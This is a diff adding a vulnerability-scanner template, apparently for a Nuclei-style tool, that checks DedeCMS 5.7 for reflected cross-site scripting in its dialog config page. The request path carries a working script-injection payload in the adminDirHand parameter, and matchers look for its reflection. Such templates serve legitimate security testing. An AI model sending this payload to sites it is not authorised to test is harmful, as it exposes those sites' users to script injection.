@@ -1,0 +1,32 @@
+id: "dedecms-config-xss"
+name: "DedeCMS 5.7 - Cross-Site Scripting"
+severity: "high"
+description: "DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site."
+tech:
+  - "php"
+tags:
+  - "dedecms"
+  - "xss"
+  - "vuln"
+cwe: "CWE-80"
+reference: "https://www.zilyun.com/8665.html"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "location='../../</script><script>alert(document.domain)</script>"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
